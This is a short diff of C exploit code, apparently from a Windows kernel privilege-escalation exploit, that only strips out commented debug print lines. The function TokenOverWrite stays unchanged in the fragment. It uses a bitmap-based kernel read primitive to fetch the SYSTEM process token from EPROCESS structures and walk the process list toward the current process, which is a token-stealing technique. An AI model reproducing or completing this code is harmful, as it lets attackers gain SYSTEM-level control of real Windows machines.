@@ -338,17 +338,12 @@ TokenOverWrite(
 	)
 {
 
-	//printf("Systoken: %llx\n", EP);
 
 	DWORD64 Systoken = BitmapRead( Mgr, Wrk, EP + (DWORD64)0x358 );
-
-	//printf("Systoken: %llx\n", Systoken);
 
 	DWORD CurrentPID = GetCurrentProcessId(); 
 
 	DWORD64 NextEp = BitmapRead( Mgr, Wrk, EP + (DWORD64)0x2f0 ) - (DWORD64)0x2e8 - (DWORD64)0x8;
-
-	//printf("Systoken: %llx\n", NextEp);
 
 	DWORD64 Current = NULL;
 
